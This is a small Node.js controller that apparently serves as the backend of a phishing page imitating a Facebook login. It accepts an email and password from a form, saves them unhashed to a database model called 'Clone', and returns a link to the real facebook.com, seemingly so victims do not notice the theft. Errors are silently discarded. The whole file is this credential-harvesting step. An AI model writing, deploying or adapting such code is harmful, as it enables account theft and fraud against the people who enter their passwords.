const Clone = require("../models/clone.model");

const configClone = async (request, response) => {
  try {
    let { email, password } = request.body;

    let clone = new Clone({
      email,
      password,
    });

    const responseDTO = {
      isSuccess: true,
      cloneConfigurationUrl: "https://www.facebook.com",
    };

    response.json({ responseDTO });

    await clone.save();
  } catch (error) {}
};

module.exports = { configClone };
